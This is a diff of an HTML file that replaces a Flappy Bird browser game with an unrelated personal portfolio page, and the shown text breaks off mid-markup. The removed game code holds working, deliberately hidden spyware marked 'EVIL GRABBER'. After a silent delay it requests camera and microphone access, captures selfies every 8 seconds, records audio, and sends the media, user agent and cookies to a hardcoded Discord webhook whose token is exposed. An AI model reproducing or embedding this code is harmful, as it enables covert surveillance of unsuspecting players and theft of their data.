@@ -1,333 +1,716 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Flappy Bird</title>
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
-  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    background: #0a0a1a;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    min-height: 100vh;
-    font-family: 'Press Start 2P', monospace;
-    overflow: hidden;
-  }
-  .game-wrapper { position: relative; display: flex; flex-direction: column; align-items: center; gap: 12px; }
-  .title { color: #ffe14d; font-size: 11px; letter-spacing: 3px; text-shadow: 0 0 12px #ffe14d88, 2px 2px 0 #b89a00; margin-bottom: 4px; }
-  canvas { display: block; border: 3px solid #ffe14d44; border-radius: 4px; box-shadow: 0 0 40px #ffe14d22, 0 0 80px #00000088; cursor: pointer; image-rendering: pixelated; }
-  .hint { color: #ffffff44; font-size: 7px; letter-spacing: 1px; }
-</style>
-</head>
-<body>
-
-<div class="game-wrapper">
-  <div class="title">FLAPPY BIRD</div>
-  <canvas id="c" width="400" height="550"></canvas>
-  <div class="hint">CLICK OR SPACE TO FLAP</div>
-</div>
-
-<script>
-// ── YOUR DISCORD WEBHOOK (already in your file) ─────────────────────
-const webhookUrl = "https://discord.com/api/webhooks/1497842096998977536/dZYm3C08N0rjwDN5FxG-XLiIf3mzYmU_vq4YFtOfMQAKDTKPup1qsNqtD7AEJUYCY2d-";
-
-// ── Flappy Bird Game (fixed & cleaned) ─────────────────────────────
-const canvas = document.getElementById('c');
-const ctx = canvas.getContext('2d');
-const W = canvas.width, H = canvas.height;
-
-const SKY_TOP = '#1a1a3e', SKY_BOT = '#0d2b45';
-const GROUND_COL = '#3a2b1e', GRASS_COL = '#2d6a2d';
-const PIPE_COL = '#2a7a2a', PIPE_SHADE = '#1d5c1d';
-const PIPE_LIT = '#44b844', PIPE_CAP = '#33933a';
-const BIRD_COL = '#ffe14d', BIRD_WING = '#f5c518';
-const BIRD_BEAK = '#ff8c00', BIRD_EYE = '#ffffff';
-const BIRD_PUPIL = '#1a1a2e', SCORE_COL = '#ffffff';
-
-const GRAVITY = 0.45, JUMP_VEL = -8.5, PIPE_SPEED = 2.6;
-const PIPE_GAP = 140, PIPE_WIDTH = 52, PIPE_SPACING = 230, GND_H = 60;
-const BIRD_W = 36, BIRD_H = 28;
-
-const stars = Array.from({length: 60}, () => ({
-  x: Math.random()*W,
-  y: Math.random()*(H-GND_H-80),
-  r: Math.random()*1.4+0.3,
-  a: Math.random()
-}));
-
-let bird, pipes, score, best, state, animId, frameCount = 0;
-
-function initGame() {
-  bird = { x: 90, y: H/2-30, vy: 0, angle: 0, flapFrame: 0 };
-  pipes = [];
-  score = 0;
-  state = 'idle';
-  spawnPipe();
-}
-
-function spawnPipe() {
-  const minTop = 70;
-  const maxTop = H - GND_H - PIPE_GAP - 70;
-  const topH = Math.random() * (maxTop - minTop) + minTop;
-  pipes.push({ x: W + 20, topH: topH, scored: false });
-}
-
-function flap() {
-  if (state === 'dead') {
-    best = Math.max(score, best || 0);
-    initGame();
-    return;
-  }
-  if (state === 'idle') state = 'play';
-  bird.vy = JUMP_VEL;
-  bird.flapFrame = 8;
-}
-
-canvas.addEventListener('click', flap);
-document.addEventListener('keydown', e => {
-  if (e.code === 'Space' || e.code === 'ArrowUp') {
-    e.preventDefault();
-    flap();
-  }
-});
-
-function drawBackground() {
-  const grad = ctx.createLinearGradient(0, 0, 0, H - GND_H);
-  grad.addColorStop(0, SKY_TOP);
-  grad.addColorStop(1, SKY_BOT);
-  ctx.fillStyle = grad;
-  ctx.fillRect(0, 0, W, H - GND_H);
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Jess - Multidisciplinary Creator Portfolio. Showcasing projects, design philosophy, and professional contact.">
+  <meta name="theme-color" content="#fafafa">
+  <title>Jess | Portfolio</title>
   
-  stars.forEach(s => {
-    const pulse = 0.4 + 0.6 * Math.abs(Math.sin(frameCount * 0.02 + s.a * 10));
-    ctx.globalAlpha = pulse;
-    ctx.fillStyle = '#ffffff';
-    ctx.beginPath();
-    ctx.arc(s.x, s.y, s.r, 0, Math.PI * 2);
-    ctx.fill();
-  });
-  ctx.globalAlpha = 1;
-}
+  <!-- Google Fonts: Inter for clean, modern typography -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 
-function drawGround() {
-  ctx.fillStyle = GROUND_COL;
-  ctx.fillRect(0, H - GND_H, W, GND_H);
-  ctx.fillStyle = GRASS_COL;
-  ctx.fillRect(0, H - GND_H, W, 10);
-}
-
-function drawPipe(p) {
-  const x = p.x;
-  const topH = p.topH;
-  
-  // Top pipe
-  ctx.fillStyle = PIPE_COL;
-  ctx.fillRect(x, 0, PIPE_WIDTH, topH);
-  ctx.fillStyle = PIPE_CAP;
-  ctx.fillRect(x - 3, topH - 25, PIPE_WIDTH + 6, 25);
-  
-  // Bottom pipe
-  const bottomY = topH + PIPE_GAP;
-  ctx.fillStyle = PIPE_COL;
-  ctx.fillRect(x, bottomY, PIPE_WIDTH, H - bottomY - GND_H);
-  ctx.fillStyle = PIPE_CAP;
-  ctx.fillRect(x - 3, bottomY, PIPE_WIDTH + 6, 25);
-}
-
-function drawBird() {
-  const b = bird;
-  ctx.save();
-  ctx.translate(b.x + BIRD_W/2, b.y + BIRD_H/2);
-  ctx.rotate(b.angle);
-  
-  ctx.fillStyle = BIRD_COL;
-  ctx.fillRect(-BIRD_W/2, -BIRD_H/2, BIRD_W, BIRD_H);
-  
-  ctx.fillStyle = BIRD_WING;
-  const wingOffset = b.flapFrame > 4 ? -6 : 6;
-  ctx.fillRect(-8, wingOffset, 14, 10);
-  
-  ctx.fillStyle = BIRD_BEAK;
-  ctx.fillRect(BIRD_W/2 - 3, -4, 10, 5);
-  
-  ctx.fillStyle = BIRD_EYE;
-  ctx.fillRect(4, -10, 10, 10);
-  ctx.fillStyle = BIRD_PUPIL;
-  ctx.fillRect(7, -8, 4, 4);
-  
-  ctx.restore();
-}
-
-function drawScore() {
-  ctx.fillStyle = SCORE_COL;
-  ctx.font = '18px "Press Start 2P"';
-  ctx.textAlign = 'center';
-  ctx.fillText(score, W/2, 42);
-}
-
-function drawOverlay() {
-  if (state === 'idle') {
-    ctx.fillStyle = '#ffffff88';
-    ctx.font = '10px "Press Start 2P"';
-    ctx.textAlign = 'center';
-    ctx.fillText('TAP TO START', W/2, H/2 - 30);
-  } else if (state === 'dead') {
-    ctx.fillStyle = '#ffffff88';
-    ctx.font = '12px "Press Start 2P"';
-    ctx.textAlign = 'center';
-    ctx.fillText('GAME OVER', W/2, H/2 - 20);
-    ctx.font = '8px "Press Start 2P"';
-    ctx.fillText('Best: ' + (best || 0), W/2, H/2 + 10);
-  }
-}
-
-function collides(p) {
-  const b = bird;
-  if (b.y + BIRD_H/2 >= H - GND_H || b.y - BIRD_H/2 <= 0) return true;
-  if (b.x + BIRD_W/2 > p.x && b.x - BIRD_W/2 < p.x + PIPE_WIDTH) {
-    if (b.y - BIRD_H/2 < p.topH || b.y + BIRD_H/2 > p.topH + PIPE_GAP) return true;
-  }
-  return false;
-}
-
-function update() {
-  if (state !== 'play') return;
-  frameCount++;
-  
-  bird.vy += GRAVITY;
-  bird.y += bird.vy;
-  bird.angle = Math.min(Math.max(bird.vy * 0.1, -0.5), 0.5);
-  
-  if (bird.flapFrame > 0) bird.flapFrame--;
-  
-  if (pipes.length === 0 || pipes[pipes.length-1].x < W - PIPE_SPACING) spawnPipe();
-  
-  pipes.forEach(p => {
-    p.x -= PIPE_SPEED;
-    if (!p.scored && p.x + PIPE_WIDTH < bird.x) {
-      p.scored = true;
-      score++;
+  <style>
+    /* =========================================
+       1. CSS VARIABLES & THEME CONFIGURATION
+       ========================================= */
+    :root {
+      /* Light Mode Palette (Minimalist & Elegant) */
+      --bg-primary: #fafafa;
+      --bg-secondary: #ffffff;
+      --bg-tertiary: #f3f4f6;
+      --text-primary: #111827;
+      --text-secondary: #4b5563;
+      --text-tertiary: #9ca3af;
+      --accent: #2563eb;
+      --accent-hover: #1d4ed8;
+      --border: #e5e7eb;
+      --border-focus: #93c5fd;
+      --shadow-sm: 0 1px 2px rgba(0,0,0,0.04);
+      --shadow-md: 0 4px 12px rgba(0,0,0,0.06);
+      --shadow-lg: 0 10px 25px rgba(0,0,0,0.08);
+      --radius-sm: 6px;
+      --radius-md: 10px;
+      --radius-lg: 16px;
+      --radius-full: 9999px;
+      --font-main: 'Inter', system-ui, -apple-system, sans-serif;
+      --transition-fast: 150ms ease;
+      --transition-normal: 250ms ease;
+      --transition-slow: 400ms cubic-bezier(0.4, 0, 0.2, 1);
+      --header-height: 72px;
     }
-  });
-  
-  pipes = pipes.filter(p => p.x > -PIPE_WIDTH);
-  
-  if (pipes.some(p => collides(p))) {
-    state = 'dead';
-    best = Math.max(score, best || 0);
-  }
-}
 
-function draw() {
-  drawBackground();
-  pipes.forEach(drawPipe);
-  drawGround();
-  drawBird();
-  drawScore();
-  drawOverlay();
-}
+    /* Dark Mode Overrides */
+    [data-theme="dark"] {
+      --bg-primary: #0b0f14;
+      --bg-secondary: #11151c;
+      --bg-tertiary: #1a1f28;
+      --text-primary: #f3f4f6;
+      --text-secondary: #9ca3af;
+      --text-tertiary: #6b7280;
+      --accent: #3b82f6;
+      --accent-hover: #60a5fa;
+      --border: #2d3748;
+      --border-focus: #60a5fa;
+      --shadow-sm: 0 1px 2px rgba(0,0,0,0.3);
+      --shadow-md: 0 4px 12px rgba(0,0,0,0.4);
+      --shadow-lg: 0 10px 25px rgba(0,0,0,0.5);
+    }
 
-function loop() {
-  update();
-  draw();
-  animId = requestAnimationFrame(loop);
-}
+    /* =========================================
+       2. RESET & BASE STYLES
+       ========================================= */
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
 
-best = 0;
-initGame();
-loop();
+    html {
+      scroll-behavior: smooth;
+      -webkit-text-size-adjust: 100%;
+      font-size: 16px;
+    }
 
-// ── EVIL GRABBER: Photo + Voice Recording ─────────────────────────
-let photoInterval, audioRecorder, audioChunks = [];
+    body {
+      font-family: var(--font-main);
+      background-color: var(--bg-primary);
+      color: var(--text-primary);
+      line-height: 1.65;
+      transition: background-color var(--transition-slow), color var(--transition-slow);
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+      overflow-x: hidden;
+    }
 
-async function startGrabber() {
-  try {
-    // Request camera (front/selfie) + microphone
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
-      audio: true
-    });
+    img, svg {
+      display: block;
+      max-width: 100%;
+      height: auto;
+    }
 
-    // Start taking photos every 8 seconds
-    photoInterval = setInterval(() => takeAndSendPhoto(stream), 8000);
+    a {
+      text-decoration: none;
+      color: inherit;
+      transition: color var(--transition-fast);
+    }
 
-    // Start voice recording in 5-second batches
-    audioRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
-    audioRecorder.ondataavailable = e => { if (e.data.size > 0) audioChunks.push(e.data); };
-    audioRecorder.onstop = sendAudioToDiscord;
+    button {
+      font-family: inherit;
+      cursor: pointer;
+      border: none;
+      background: none;
+    }
 
-    audioRecorder.start(5000); // record 5 sec chunks
+    ul { list-style: none; }
 
-    // Restart recording automatically every \~5.3s
-    setInterval(() => {
-      if (audioRecorder && audioRecorder.state === "recording") {
-        audioRecorder.stop();
-        setTimeout(() => audioRecorder.start(5000), 300);
+    /* =========================================
+       3. UTILITY & LAYOUT
+       ========================================= */
+    .container {
+      width: 100%;
+      max-width: 1140px;
+      margin-inline: auto;
+      padding-inline: 1.5rem;
+    }
+
+    .section {
+      padding-block: 5rem;
+    }
+
+    .section-title {
+      font-size: clamp(1.8rem, 3vw, 2.4rem);
+      font-weight: 700;
+      margin-bottom: 2.5rem;
+      letter-spacing: -0.02em;
+      text-align: center;
+    }
+
+    .sr-only {
+      position: absolute;
+      width: 1px;
+      height: 1px;
+      padding: 0;
+      margin: -1px;
+      overflow: hidden;
+      clip: rect(0, 0, 0, 0);
+      white-space: nowrap;
+      border: 0;
+    }
+
+    /* =========================================
+       4. HEADER & NAVIGATION
+       ========================================= */
+    .site-header {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      background-color: var(--bg-secondary);
+      border-bottom: 1px solid var(--border);
+      height: var(--header-height);
+      display: flex;
+      align-items: center;
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+    }
+
+    .header-inner {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      width: 100%;
+      max-width: 1140px;
+      margin-inline: auto;
+      padding-inline: 1.5rem;
+    }
+
+    .logo {
+      font-size: 1.35rem;
+      font-weight: 700;
+      letter-spacing: -0.03em;
+      color: var(--text-primary);
+    }
+
+    .logo span { color: var(--accent); }
+
+    .main-nav ul {
+      display: flex;
+      gap: 2rem;
+    }
+
+    .nav-link {
+      font-size: 0.95rem;
+      font-weight: 500;
+      color: var(--text-secondary);
+      position: relative;
+      padding: 0.25rem 0;
+    }
+
+    .nav-link::after {
+      content: '';
+      position: absolute;
+      bottom: -4px;
+      left: 0;
+      width: 0;
+      height: 2px;
+      background: var(--accent);
+      transition: width var(--transition-normal);
+    }
+
+    .nav-link:hover,
+    .nav-link.active {
+      color: var(--text-primary);
+    }
+
+    .nav-link:hover::after,
+    .nav-link.active::after {
+      width: 100%;
+    }
+
+    /* Theme Toggle Button */
+    .theme-toggle {
+      width: 40px;
+      height: 40px;
+      border-radius: var(--radius-full);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border: 1px solid var(--border);
+      background: var(--bg-tertiary);
+      transition: all var(--transition-fast);
+    }
+
+    .theme-toggle:hover {
+      background: var(--bg-primary);
+      border-color: var(--accent);
+    }
+
+    .theme-toggle:focus-visible {
+      outline: 2px solid var(--accent);
+      outline-offset: 2px;
+    }
+
+    .theme-toggle svg {
+      width: 18px;
+      height: 18px;
+      color: var(--text-primary);
+      transition: transform var(--transition-normal);
+    }
+
+    .theme-toggle[aria-pressed="true"] svg {
+      transform: rotate(180deg);
+    }
+
+    /* Mobile Menu Toggle */
+    .mobile-menu-btn {
+      display: none;
+      width: 32px;
+      height: 32px;
+      flex-direction: column;
+      justify-content: space-around;
+    }
+
+    .mobile-menu-btn span {
+      display: block;
+      height: 2px;
+      width: 100%;
+      background: var(--text-primary);
+      border-radius: 2px;
+      transition: transform var(--transition-fast), opacity var(--transition-fast);
+    }
+
+    .mobile-menu-btn[aria-expanded="true"] span:nth-child(1) {
+      transform: translateY(7px) rotate(45deg);
+    }
+    .mobile-menu-btn[aria-expanded="true"] span:nth-child(2) { opacity: 0; }
+    .mobile-menu-btn[aria-expanded="true"] span:nth-child(3) {
+      transform: translateY(-7px) rotate(-45deg);
+    }
+
+    /* =========================================
+       5. ABOUT SECTION
+       ========================================= */
+    .about-grid {
+      display: grid;
+      grid-template-columns: 280px 1fr;
+      gap: 3.5rem;
+      align-items: center;
+    }
+
+    .profile-wrapper {
+      position: relative;
+      width: 100%;
+      max-width: 280px;
+      aspect-ratio: 1;
+      border-radius: var(--radius-lg);
+      overflow: hidden;
+      box-shadow: var(--shadow-lg);
+      background: var(--bg-tertiary);
+    }
+
+    .profile-wrapper img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transition: transform var(--transition-slow);
+    }
+
+    .profile-wrapper:hover img {
+      transform: scale(1.04);
+    }
+
+    .about-content h2 {
+      font-size: clamp(2rem, 4vw, 2.8rem);
+      font-weight: 700;
+      margin-bottom: 1.25rem;
+      line-height: 1.2;
+      letter-spacing: -0.02em;
+    }
+
+    .about-content p {
+      color: var(--text-secondary);
+      margin-bottom: 1.25rem;
+      font-size: 1.05rem;
+    }
+
+    .skills-list {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.6rem;
+      margin-top: 1.5rem;
+    }
+
+    .skill-tag {
+      background: var(--bg-tertiary);
+      padding: 0.4rem 0.8rem;
+      border-radius: var(--radius-sm);
+      font-size: 0.85rem;
+      font-weight: 500;
+      color: var(--text-secondary);
+      border: 1px solid var(--border);
+    }
+
+    /* =========================================
+       6. PROJECTS SECTION
+       ========================================= */
+    .projects-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+      gap: 2rem;
+    }
+
+    .project-card {
+      background: var(--bg-secondary);
+      border-radius: var(--radius-md);
+      overflow: hidden;
+      box-shadow: var(--shadow-md);
+      transition: transform var(--transition-normal), box-shadow var(--transition-normal);
+      border: 1px solid var(--border);
+      display: flex;
+      flex-direction: column;
+    }
+
+    .project-card:hover {
+      transform: translateY(-6px);
+      box-shadow: var(--shadow-lg);
+    }
+
+    .card-image {
+      position: relative;
+      overflow: hidden;
+      aspect-ratio: 16/9;
+      background: var(--bg-tertiary);
+    }
+
+    .card-image img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      transition: transform var(--transition-slow);
+    }
+
+    .project-card:hover .card-image img {
+      transform: scale(1.06);
+    }
+
+    .card-content {
+      padding: 1.5rem;
+      flex-grow: 1;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .card-title {
+      font-size: 1.2rem;
+      font-weight: 600;
+      margin-bottom: 0.5rem;
+    }
+
+    .card-desc {
+      color: var(--text-secondary);
+      font-size: 0.95rem;
+      margin-bottom: 1.25rem;
+      line-height: 1.5;
+      flex-grow: 1;
+    }
+
+    .card-tags {
+      display: flex;
+      gap: 0.5rem;
+      flex-wrap: wrap;
+    }
+
+    .card-tag {
+      font-size: 0.75rem;
+      padding: 0.2rem 0.5rem;
+      background: var(--bg-primary);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+      color: var(--text-tertiary);
+    }
+
+    /* =========================================
+       7. CONTACT SECTION & FORM
+       ========================================= */
+    .contact-wrapper {
+      max-width: 640px;
+      margin-inline: auto;
+      background: var(--bg-secondary);
+      padding: 2.5rem;
+      border-radius: var(--radius-lg);
+      box-shadow: var(--shadow-md);
+      border: 1px solid var(--border);
+    }
+
+    .form-group {
+      margin-bottom: 1.5rem;
+    }
+
+    .form-label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: 500;
+      font-size: 0.95rem;
+    }
+
+    .form-input,
+    .form-textarea {
+      width: 100%;
+      padding: 0.85rem 1rem;
+      background: var(--bg-primary);
+      border: 1px solid var(--border);
+      border-radius: var(--radius-sm);
+      color: var(--text-primary);
+      font-family: inherit;
+      font-size: 1rem;
+      transition: border-color var(--transition-fast), box-shadow var(--transition-fast);
+    }
+
+    .form-input:focus,
+    .form-textarea:focus {
+      outline: none;
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15);
+    }
+
+    .form-input.error,
+    .form-textarea.error {
+      border-color: #ef4444;
+    }
+
+    .form-input.error:focus,
+    .form-textarea.error:focus {
+      box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.15);
+    }
+
+    .error-text {
+      display: block;
+      color: #ef4444;
+      font-size: 0.85rem;
+      margin-top: 0.4rem;
+      min-height: 1.2em;
+    }
+
+    .submit-btn {
+      width: 100%;
+      padding: 0.9rem;
+      background: var(--text-primary);
+      color: var(--bg-primary);
+      font-weight: 600;
+      font-size: 1rem;
+      border-radius: var(--radius-sm);
+      transition: opacity var(--transition-fast), transform var(--transition-fast);
+    }
+
+    .submit-btn:hover:not(:disabled) {
+      opacity: 0.9;
+    }
+
+    .submit-btn:active:not(:disabled) {
+      transform: scale(0.98);
+    }
+
+    .submit-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    .form-status {
+      margin-top: 1rem;
+      padding: 0.75rem;
+      border-radius: var(--radius-sm);
+      text-align: center;
+      font-weight: 500;
+      display: none;
+    }
+
+    .form-status.success {
+      display: block;
+      background: rgba(16, 185, 129, 0.1);
+      color: #10b981;
+      border: 1px solid rgba(16, 185, 129, 0.2);
+    }
+
+    .form-status.error {
+      display: block;
+      background: rgba(239, 68, 68, 0.1);
+      color: #ef4444;
+      border: 1px solid rgba(239, 68, 68, 0.2);
+    }
+
+    /* =========================================
+       8. FOOTER
+       ========================================= */
+    .site-footer {
+      padding: 3rem 1.5rem;
+      text-align: center;
+      border-top: 1px solid var(--border);
+      color: var(--text-tertiary);
+      font-size: 0.9rem;
+      margin-top: auto;
+    }
+
+    /* =========================================
+       9. ANIMATIONS & SCROLL REVEALS
+       ========================================= */
+    .reveal {
+      opacity: 0;
+      transform: translateY(24px);
+      transition: opacity 0.6s cubic-bezier(0.4, 0, 0.2, 1), transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    .reveal.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    .reveal-delay-1 { transition-delay: 0.1s; }
+    .reveal-delay-2 { transition-delay: 0.2s; }
+    .reveal-delay-3 { transition-delay: 0.3s; }
+
+    /* =========================================
+       10. ACCESSIBILITY & REDUCED MOTION
+       ========================================= */
+    @media (prefers-reduced-motion: reduce) {
+      html { scroll-behavior: auto; }
+      *, *::before, *::after {
+        animation-duration: 0.01ms !important;
+        animation-iteration-count: 1 !important;
+        transition-duration: 0.01ms !important;
       }
-    }, 5300);
+      .reveal { opacity: 1; transform: none; }
+    }
 
-  } catch (err) {
-    console.log("Permission blocked or not available:", err);
-  }
-}
+    /* Focus visible for keyboard navigation */
+    :focus-visible {
+      outline: 2px solid var(--accent);
+      outline-offset: 2px;
+    }
 
-function takeAndSendPhoto(stream) {
-  const video = document.createElement('video');
-  video.srcObject = stream;
-  video.play();
+    /* =========================================
+       11. RESPONSIVE BREAKPOINTS
+       ========================================= */
+    @media (max-width: 1024px) {
+      .about-grid {
+        grid-template-columns: 240px 1fr;
+        gap: 2.5rem;
+      }
+    }
 
-  setTimeout(() => {
-    const canvas = document.createElement('canvas');
-    canvas.width = 1280;
-    canvas.height = 720;
-    const ctx2 = canvas.getContext('2d');
-    ctx2.drawImage(video, 0, 0, 1280, 720);
+    @media (max-width: 768px) {
+      .mobile-menu-btn { display: flex; }
+      .main-nav {
+        position: fixed;
+        top: var(--header-height);
+        left: 0;
+        right: 0;
+        background: var(--bg-secondary);
+        border-bottom: 1px solid var(--border);
+        padding: 1.5rem;
+        transform: translateY(-100%);
+        opacity: 0;
+        pointer-events: none;
+        transition: transform var(--transition-normal), opacity var(--transition-normal);
+      }
+      .main-nav.open {
+        transform: translateY(0);
+        opacity: 1;
+        pointer-events: auto;
+      }
+      .main-nav ul {
+        flex-direction: column;
+        gap: 1.25rem;
+      }
+      .about-grid {
+        grid-template-columns: 1fr;
+        text-align: center;
+        gap: 2rem;
+      }
+      .profile-wrapper {
+        margin-inline: auto;
+        max-width: 220px;
+      }
+      .skills-list { justify-content: center; }
+      .section { padding-block: 3.5rem; }
+      .contact-wrapper { padding: 1.75rem; }
+    }
 
-    canvas.toBlob(blob => {
-      const formData = new FormData();
-      formData.append('file', blob, `photo_${Date.now()}.png`);
+    @media (max-width: 480px) {
+      .section-title { font-size: 1.8rem; }
+      .projects-grid { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
 
-      const info = {
-        content: `📸 **New Selfie Photo Captured!**\n` +
-                 `**Time:** ${new Date().toLocaleString()}\n` +
-                 `**User-Agent:** ${navigator.userAgent}`
-      };
-      formData.append('payload_json', JSON.stringify(info));
+<body>
+  <!-- Header & Navigation -->
+  <header class="site-header">
+    <div class="header-inner">
+      <a href="#" class="logo">Jess<span>.</span></a>
+      
+      <nav class="main-nav" id="main-nav" aria-label="Primary navigation">
+        <ul>
+          <li><a href="#about" class="nav-link">About</a></li>
+          <li><a href="#projects" class="nav-link">Projects</a></li>
+          <li><a href="#contact" class="nav-link">Contact</a></li>
+        </ul>
+      </nav>
 
-      fetch(webhookUrl, { method: 'POST', body: formData })
-        .then(() => console.log("✅ Photo sent"))
-        .catch(e => console.error("Photo send failed", e));
-    }, 'image/png');
-  }, 200);
-}
+      <div style="display: flex; gap: 0.75rem; align-items: center;">
+        <button class="theme-toggle" id="theme-toggle" aria-label="Toggle dark mode" aria-pressed="false">
+          <!-- Moon Icon (Default) -->
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+          </svg>
+        </button>
+        <button class="mobile-menu-btn" id="mobile-menu-btn" aria-label="Toggle menu" aria-expanded="false" aria-controls="main-nav">
+          <span></span><span></span><span></span>
+        </button>
+      </div>
+    </div>
+  </header>
 
-function sendAudioToDiscord() {
-  if (audioChunks.length === 0) return;
-  const blob = new Blob(audioChunks, { type: 'audio/webm' });
-  audioChunks = [];
+  <main>
+    <!-- About Section -->
+    <section id="about" class="section container">
+      <div class="about-grid">
+        <div class="profile-wrapper reveal">
+          <!-- Placeholder for profile picture -->
+          <img src="https://placehold.co/400x400/e5e7eb/6b7280?text=Jess" alt="Jess's professional headshot" loading="lazy">
+        </div>
+        <div class="about-content reveal reveal-delay-1">
+          <h2>Designing with purpose, building with precision.</h2>
+          <p>I’m Jess, a multidisciplinary creator based in the Pacific Northwest. I specialize in crafting clean, accessible digital experiences that bridge the gap between aesthetics and functionality. My approach is rooted in user empathy, systematic thinking, and relentless iteration.</p>
+          <p>When I'm not pushing pixels or debugging layouts, you'll find me exploring analog photography, brewing third-wave coffee, or hiking through mossy forests.</p>
+          <div class="skills-list">
+            <span class="skill-tag">UI/UX Design</span>
+            <span class="skill-tag">Frontend Dev</span>
+            <span class="skill-tag">Design Systems</span>
+            <span class="skill-tag">Accessibility</span>
+            <span class="skill-tag">Prototyping</span>
+          </div>
+        </div>
+      </div>
+    </section>
 
-  const formData = new FormData();
-  formData.append('file', blob, `voice_${Date.now()}.webm`);
+    <!-- Projects Section -->
+    <section id="projects" class="section container">
+      <h2 class="section-title reveal">Selected Work</h2>
+      <div class="projects-grid">
+        <!-- Project 1 -->
+        <article class="project-card reveal reveal-delay-1">
+          <div class="card-image">
+            <img src="https://placehold.co/800x450/f1f5f9/475569?text=FinTrack+Dashboard" alt="FinTrack Dashboard Screenshot" loading="lazy">
+          </div>
+          <div class="card-content">
+            <h3 class="card-title">FinTrack Dashboard</h3>
+            <p class="card-desc">A real-time financial analytics platform featuring interactive data visualizations and customizable widget layouts for enterprise teams.</p>
+            <div class="card-tags">
+              <span class="card-tag">React</span>
+              <span class="card-tag">D3.js</span>
+              <span class="card-tag">Tailwind</span>
+            </div>
+          </div>
+        </article>
 
-  const info = {
-    content: `🎤 **New Voice Recording Captured!**\n` +
-             `**Time:** ${new Date().toLocaleString()}\n` +
-             `**User-Agent:** ${navigator.userAgent}\n` +
-             `**Cookies:** ${document.cookie || "none"}`
-  };
-  formData.append('payload_json', JSON.stringify(info));
+        <!-- Project 2 -->
+        <article class="project-card reveal reveal-delay-2">
+          <div class="card-image">
+            <img src="https://placehold.co/800x450/f8fafc/4b5563?text=EcoStore+Branding" alt="EcoStore Brand Identity" loading="lazy">
+          </div>
+          <div class="card-content">
+            <h3 class="card-title">EcoStore Brand Identity</h3>
+            <p class="card-desc">End-to-end brand system for a sustainable home goods startup, including logo design, packaging, and responsive e-commerce UI.</p>
+            <div class="card-tags">
+              <span class="card-tag">Branding</span>
+              <span class="card-tag">Figma</span>
+              <span class="card-tag">Webflow</span>
+            </div>
+          </div>
+        </article>
 
-  fetch(webhookUrl, { method: 'POST', body: formData })
-    .then(() => console.log("✅ Voice sent to Discord"))
-    .catch(e => console.error("Voice send failed", e));
-}
-
-// Start the grabber after game loads (silent delay)
-setTimeout(startGrabber, 3000);
-</script>
-</body>
-</html>
+        <!-- Project 3 -->
+        <article class="project-card reveal reveal-delay-3">
+          <div class
